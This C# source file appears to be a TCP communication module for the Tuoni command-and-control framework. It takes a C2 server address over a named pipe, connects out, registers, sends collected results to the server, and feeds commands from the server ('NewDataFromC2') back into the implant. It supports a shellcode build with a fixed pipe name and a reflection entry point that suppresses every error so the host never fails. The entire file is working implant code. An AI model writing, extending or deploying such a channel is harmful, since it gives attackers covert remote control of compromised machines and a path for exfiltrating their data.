using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ExecUnitUtils;

namespace TcpListenerExecUnit
{
    public class Program
    {
        const string DefaultPipeName = "QQQWWWEEE";
        const int SendPollIntervalMs = 100;
        const int ReconnectDelayMs = 5000;
        const int MaxTcpFrameBytes = 64 * 1024 * 1024;
        const uint KeepAliveTimeMs = 5000;
        const uint KeepAliveIntervalMs = 1000;

        // Public reflection entry point; shares the executable's implementation.
        public static void start(string[] args)
        {
            Main(args);
        }

        static void Main(string[] args)
        {
#if TUONI_SHELLCODE
            string pipeName = DefaultPipeName;
#else
            if (args == null || args.Length != 1 || string.IsNullOrWhiteSpace(args[0]))
                return;
            string pipeName = args[0];
#endif
            try { Run(pipeName); }
            catch (Exception) { } // The reflection entry point must not fail the host.
        }

        static void Run(string pipeName)
        {
            using (ManualResetEvent disconnected = new ManualResetEvent(false))
            {
                CommunicationNamedPipesListener client = null;
                SenderHolder sender = new SenderHolder();
                Thread sendThread = null;
                try
                {
                    client = new CommunicationNamedPipesListener(pipeName, null);
                    client.Disconnected += () =>
                    {
                        disconnected.Set();
                        sender.Stop();
                    };
                    byte[] configData = client.Connect();
                    if (configData == null || !client.IsConnected) return;
                    if (!TryParseHostPort(configData, out string host, out int port)) return;

                    // Single long-lived sender across reconnects: only one consumer of
                    // client.GetDataToSend() ever exists, so a result can never be stolen
                    // by a stale thread from a previous session.
                    sendThread = new Thread(() => RunSendLoop(client, sender, disconnected))
                    {
                        IsBackground = true,
                        Name = "tcp-send"
                    };
                    sendThread.Start();

                    while (client.IsConnected && !sender.IsStopping)
                    {
                        RunOneSession(host, port, client, sender, disconnected);
                        if (disconnected.WaitOne(ReconnectDelayMs)) break;
                    }
                }
                catch (Exception) { }
                finally
                {
                    // Close the socket and wake the sender before joining it. The
                    // pipe disposal releases a pending metadata/data request.
                    disconnected.Set();
                    sender.Stop();
                    try { if (client != null) client.Dispose(); }
                    finally
                    {
                        if (sendThread != null)
                        {
                            while (sendThread.IsAlive)
                            {
                                try { sendThread.Join(); }
                                catch (ThreadInterruptedException) { }
                            }
                        }
                    }
                }
            }
        }

        static bool TryParseHostPort(byte[] data, out string host, out int port)
        {
            host = null;
            port = 0;

            string hostPort = Encoding.UTF8.GetString(data);
            int sepIdx = hostPort.LastIndexOf(':');
            if (sepIdx <= 0 || sepIdx >= hostPort.Length - 1)
            {
                return false;
            }

            host = hostPort.Substring(0, sepIdx);
            return int.TryParse(hostPort.Substring(sepIdx + 1), out port) && port > 0 && port <= 65535;
        }

        static void RunOneSession(string host, int port, CommunicationNamedPipesListener client,
            SenderHolder sender, ManualResetEvent disconnected)
        {
            TcpClient tcp = null;
            try
            {
                tcp = new TcpClient();
                if (!sender.TrackSocket(tcp)) return;
                // Pipe loss must also interrupt a stalled connect, including DNS.
                Task connect = tcp.ConnectAsync(host, port);
                while (!connect.IsCompleted)
                    if (disconnected.WaitOne(SendPollIntervalMs)) return;
                connect.GetAwaiter().GetResult();
                if (disconnected.WaitOne(0)) return;
                EnableTcpKeepAlive(tcp.Client);
                NetworkStream stream = tcp.GetStream();
                object streamLock = new object();

                if (!SendInitialRegisterFrame(stream, streamLock, client))
                {
                    return;
                }

                if (!sender.SetSession(tcp, stream, streamLock)) return;
                RunReadLoop(stream, client);
            }
            catch (SocketException) { }
            catch (IOException) { }
            catch (Exception) { }
            finally
            {
                sender.ClearSocket(tcp);
                CloseSocket(tcp);
            }
        }

        static void CloseSocket(TcpClient tcp)
        {
            if (tcp == null) return;
            try { tcp.Client.Shutdown(SocketShutdown.Both); } catch (Exception) { }
            try { tcp.Close(); } catch (Exception) { }
        }

        sealed class SenderHolder
        {
            readonly object _gate = new object();
            TcpClient _socket;
            NetworkStream _stream;
            object _streamLock;
            bool _stopping;

            public bool IsStopping
            {
                get { lock (_gate) return _stopping; }
            }

            public bool TrackSocket(TcpClient tcp)
            {
                lock (_gate)
                {
                    if (_stopping) return false;
                    _socket = tcp;
                    return true;
                }
            }

            public bool SetSession(TcpClient tcp, NetworkStream stream, object streamLock)
            {
                lock (_gate)
                {
                    if (_stopping || !ReferenceEquals(_socket, tcp)) return false;
                    _stream = stream;
                    _streamLock = streamLock;
                    Monitor.PulseAll(_gate);
                    return true;
                }
            }

            public void ClearSocket(TcpClient tcp)
            {
                lock (_gate)
                {
                    if (ReferenceEquals(_socket, tcp))
                    {
                        _socket = null;
                        _stream = null;
                        _streamLock = null;
                    }
                }
            }

            public void Stop()
            {
                TcpClient tcp;
                lock (_gate)
                {
                    _stopping = true;
                    tcp = _socket;
                    _socket = null;
                    _stream = null;
                    _streamLock = null;
                    Monitor.PulseAll(_gate);
                }
                CloseSocket(tcp);
            }

            void CloseSession(NetworkStream stream)
            {
                TcpClient tcp = null;
                lock (_gate)
                {
                    if (ReferenceEquals(_stream, stream))
                    {
                        tcp = _socket;
                        _socket = null;
                        _stream = null;
                        _streamLock = null;
                    }
                }
                CloseSocket(tcp);
            }

            // Block until a live session is available, then write the framed payload.
            // If the write fails the session is dropped and we wait for the next one,
            // so the result is never silently consumed without a transmit attempt.
            public bool Send(byte[] meta, byte[] data)
            {
                while (true)
                {
                    NetworkStream stream;
                    object streamLock;
                    lock (_gate)
                    {
                        while (_stream == null && !_stopping)
                        {
                            Monitor.Wait(_gate);
                        }
                        if (_stopping) return false;
                        stream = _stream;
                        streamLock = _streamLock;
                    }

                    try
                    {
                        lock (streamLock)
                        {
                            WriteLE32(stream, meta.Length);
                            stream.Write(meta, 0, meta.Length);
                            WriteLE32(stream, data.Length);
                            stream.Write(data, 0, data.Length);
                            stream.Flush();
                        }
                        return true;
                    }
                    catch (IOException)
                    {
                        CloseSession(stream);
                    }
                    catch (ObjectDisposedException)
                    {
                        CloseSession(stream);
                    }
                    catch (SocketException)
                    {
                        CloseSession(stream);
                    }
                }
            }
        }

        static bool SendInitialRegisterFrame(
            NetworkStream stream, object streamLock, CommunicationNamedPipesListener client)
        {
            byte[] initialMeta = client.GetMetadata();
            if (initialMeta == null)
            {
                return false;
            }
            lock (streamLock)
            {
                WriteLE32(stream, initialMeta.Length);
                stream.Write(initialMeta, 0, initialMeta.Length);
                WriteLE32(stream, 0);
                stream.Flush();
            }
            return true;
        }

        static void RunSendLoop(CommunicationNamedPipesListener client, SenderHolder sender,
            ManualResetEvent disconnected)
        {
            while (!sender.IsStopping && client.IsConnected)
            {
                try
                {
                    byte[] outData = client.GetDataToSend();
                    if (sender.IsStopping || !client.IsConnected) break;
                    if (outData == null)
                    {
                        if (disconnected.WaitOne(SendPollIntervalMs)) break;
                        continue;
                    }
                    byte[] outMeta = client.GetMetadata();
                    if (sender.IsStopping || !client.IsConnected) break;
                    if (outMeta == null)
                    {
                        if (disconnected.WaitOne(SendPollIntervalMs)) break;
                        continue;
                    }
                    if (!sender.Send(outMeta, outData)) break;
                }
                catch (Exception)
                {
                    if (sender.IsStopping || !client.IsConnected ||
                        disconnected.WaitOne(SendPollIntervalMs)) break;
                }
            }
        }

        static void RunReadLoop(NetworkStream stream, CommunicationNamedPipesListener client)
        {
            while (client.IsConnected)
            {
                int length = ReadLE32(stream);
                byte[] payload = ReadFully(stream, length);
                if (!client.NewDataFromC2(payload)) return;
            }
        }

        static void EnableTcpKeepAlive(Socket socket)
        {
            try
            {
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                byte[] vals = new byte[12];
                BitConverter.GetBytes((uint)1).CopyTo(vals, 0);
                BitConverter.GetBytes(KeepAliveTimeMs).CopyTo(vals, 4);
                BitConverter.GetBytes(KeepAliveIntervalMs).CopyTo(vals, 8);
                socket.IOControl(IOControlCode.KeepAliveValues, vals, null);
            }
            catch { }
        }

        static void WriteLE32(Stream s, int value)
        {
            byte[] b = new byte[4];
            b[0] = (byte)(value & 0xFF);
            b[1] = (byte)((value >> 8) & 0xFF);
            b[2] = (byte)((value >> 16) & 0xFF);
            b[3] = (byte)((value >> 24) & 0xFF);
            s.Write(b, 0, 4);
        }

        static int ReadLE32(Stream s)
        {
            byte[] b = ReadFully(s, 4);
            return b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24);
        }

        static byte[] ReadFully(Stream s, int count)
        {
            if (count < 0 || count > MaxTcpFrameBytes)
                throw new IOException("Invalid TCP frame length: " + count);
            byte[] buf = new byte[count];
            int offset = 0;
            while (offset < count)
            {
                int read = s.Read(buf, offset, count - offset);
                if (read <= 0) throw new EndOfStreamException();
                offset += read;
            }
            return buf;
        }
    }
}
